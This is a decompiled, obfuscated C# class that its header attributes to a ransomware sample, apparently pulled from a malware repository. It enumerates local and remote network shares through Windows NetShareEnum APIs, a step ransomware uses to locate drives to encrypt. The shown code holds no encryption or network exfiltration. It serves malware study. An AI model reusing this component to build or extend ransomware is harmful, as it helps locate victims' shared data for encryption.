// Decompiled with JetBrains decompiler
// Type: ns0.Class43
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: 017B0DCA-B8B5-40B9-B848-18A1270CDB8F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-08b2c37daa8dd06294ac2deaa8689a195e18fd9674da39ab2a4fad9b91baa664.exe

using ns3;
using ns5;
using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace ns0
{
  internal sealed class Class43 : ReadOnlyCollectionBase
  {
    private string string_0;

    [SpecialName]
    protected static bool smethod_0() => PlatformID.Win32NT == Environment.OSVersion.Platform;

    [SpecialName]
    protected static bool smethod_1()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      return PlatformID.Win32NT == osVersion.Platform && osVersion.Version.Major >= 5;
    }

    [DllImport("netapi32", CharSet = CharSet.Unicode)]
    protected static extern int NetShareEnum(
      string lpServerName,
      int dwLevel,
      out IntPtr lpBuffer,
      int dwPrefMaxLen,
      out int entriesRead,
      out int totalEntries,
      ref int hResume);

    [DllImport("svrapi", EntryPoint = "NetShareEnum", CharSet = CharSet.Ansi)]
    protected static extern int NetShareEnum_1(
      [MarshalAs(UnmanagedType.LPTStr)] string lpServerName,
      int dwLevel,
      IntPtr lpBuffer,
      ushort cbBuffer,
      out ushort entriesRead,
      out ushort totalEntries);

    [DllImport("netapi32")]
    protected static extern int NetApiBufferFree(IntPtr intptr_0);

    protected static void smethod_2(string string_1, Class43 class43_0)
    {
      int dwLevel = 2;
      int hResume = 0;
      IntPtr lpBuffer = IntPtr.Zero;
      try
      {
        int entriesRead;
        int totalEntries;
        int num1 = Class43.NetShareEnum(string_1, dwLevel, out lpBuffer, -1, out entriesRead, out totalEntries, ref hResume);
        if (5 == num1)
        {
          dwLevel = 1;
          num1 = Class43.NetShareEnum(string_1, 1, out lpBuffer, -1, out entriesRead, out totalEntries, ref hResume);
        }
        if (num1 != 0 || entriesRead <= 0)
          return;
        Type type = 2 == dwLevel ? typeof (Class43.Struct7) : typeof (Class43.Struct8);
        int num2 = Marshal.SizeOf(type);
        int num3 = 0;
        int int32 = lpBuffer.ToInt32();
        while (num3 < entriesRead)
        {
          IntPtr ptr = new IntPtr(int32);
          if (1 == dwLevel)
          {
            Class43.Struct8 structure = (Class43.Struct8) Marshal.PtrToStructure(ptr, type);
            class43_0.method_0(structure.string_0, string.Empty, structure.enum7_0, structure.string_1);
          }
          else
          {
            Class43.Struct7 structure = (Class43.Struct7) Marshal.PtrToStructure(ptr, type);
            class43_0.method_0(structure.string_0, structure.string_2, structure.enum7_0, structure.string_1);
          }
          ++num3;
          int32 += num2;
        }
      }
      finally
      {
        if (IntPtr.Zero != lpBuffer)
          Class43.NetApiBufferFree(lpBuffer);
      }
    }

    protected static void smethod_3(string string_1, Class43 class43_0)
    {
      int dwLevel = 50;
      Type type = typeof (Class43.Struct9);
      int num1 = Marshal.SizeOf(type);
      ushort num2 = (ushort) (20 * num1);
      IntPtr num3 = Marshal.AllocHGlobal((int) num2);
      try
      {
        ushort entriesRead;
        ushort totalEntries;
        int num4 = Class43.NetShareEnum_1(string_1, dwLevel, num3, num2, out entriesRead, out totalEntries);
        if (124 == num4)
        {
          dwLevel = 1;
          type = typeof (Class43.Struct10);
          num1 = Marshal.SizeOf(type);
          num4 = Class43.NetShareEnum_1(string_1, 1, num3, num2, out entriesRead, out totalEntries);
        }
        if (num4 != 0 && 234 != num4)
        {
          Console.WriteLine(num4);
        }
        else
        {
          int num5 = 0;
          int int32 = num3.ToInt32();
          while (num5 < (int) entriesRead)
          {
            IntPtr ptr = new IntPtr(int32);
            if (1 == dwLevel)
            {
              Class43.Struct10 structure = (Class43.Struct10) Marshal.PtrToStructure(ptr, type);
              class43_0.method_0(structure.string_0, string.Empty, structure.method_0(), structure.string_1);
            }
            else
            {
              Class43.Struct9 structure = (Class43.Struct9) Marshal.PtrToStructure(ptr, type);
              class43_0.method_0(structure.string_0, structure.string_2, structure.method_0(), structure.string_1);
            }
            ++num5;
            int32 += num1;
          }
        }
      }
      finally
      {
        Marshal.FreeHGlobal(num3);
      }
    }

    protected static void smethod_4(string string_1, Class43 class43_0)
    {
      switch (string_1)
      {
        case "":
        case null:
          if (Class43.smethod_0())
          {
            Class43.smethod_2(string_1, class43_0);
            break;
          }
          Class43.smethod_3(string_1, class43_0);
          break;
        default:
          if (!Class43.smethod_1())
          {
            string_1 = string_1.ToUpper();
            if ('\\' != string_1[0] || '\\' != string_1[1])
            {
              string_1 = "\\\\" + string_1;
              goto case "";
            }
            else
              goto case "";
          }
          else
            goto case "";
      }
    }

    public static bool smethod_5(string string_1)
    {
      switch (string_1)
      {
        case "":
        case null:
          return false;
        default:
          char upper = char.ToUpper(string_1[0]);
          return 'A' <= upper && upper <= 'Z' && (int) Path.VolumeSeparatorChar == (int) string_1[1] && (int) Path.DirectorySeparatorChar == (int) string_1[2];
      }
    }

    public static Class43 smethod_6(string string_1) => new Class43(string_1);

    public Class43()
    {
      this.string_0 = string.Empty;
      Class43.smethod_4(this.string_0, this);
    }

    public Class43(string string_1)
    {
      this.string_0 = string_1;
      Class43.smethod_4(this.string_0, this);
    }

    protected void Add(Class42 class42_0) => this.InnerList.Add((object) class42_0);

    protected void method_0(string string_1, string string_2, Enum7 enum7_0, string string_3) => this.InnerList.Add((object) new Class42(this.string_0, string_1, string_2, enum7_0, string_3));

    public Class42 this[int int_0] => (Class42) this.InnerList[int_0];

    public Class42 this[string string_1]
    {
      get
      {
        switch (string_1)
        {
          case "":
          case null:
            return (Class42) null;
          default:
            string_1 = Path.GetFullPath(string_1);
            if (!Class43.smethod_5(string_1))
              return (Class42) null;
            Class42 class42 = (Class42) null;
            for (int index = 0; index < this.InnerList.Count; ++index)
            {
              Class42 inner = (Class42) this.InnerList[index];
              if (inner.method_2() && inner.method_3(string_1))
              {
                if (class42 == null)
                  class42 = inner;
                else if (class42.method_0().Length < inner.method_0().Length && (inner.method_1() == Enum7.const_0 || class42.method_1() != Enum7.const_0))
                  class42 = inner;
              }
            }
            return class42;
        }
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    protected struct Struct7
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_0;
      public Enum7 enum7_0;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_1;
      public int int_0;
      public int int_1;
      public int int_2;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_2;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_3;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    protected struct Struct8
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_0;
      public Enum7 enum7_0;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string string_1;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    protected struct Struct9
    {
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 13)]
      public string string_0;
      public byte byte_0;
      public ushort ushort_0;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string string_1;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string string_2;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 9)]
      public string string_3;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 9)]
      public string string_4;

      [SpecialName]
      public Enum7 method_0() => (Enum7) ((int) this.byte_0 & (int) sbyte.MaxValue);
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    protected struct Struct10
    {
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 13)]
      public string string_0;
      public byte byte_0;
      public ushort ushort_0;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string string_1;

      [SpecialName]
      public Enum7 method_0() => (Enum7) ((int) this.ushort_0 & (int) short.MaxValue);
    }
  }
}
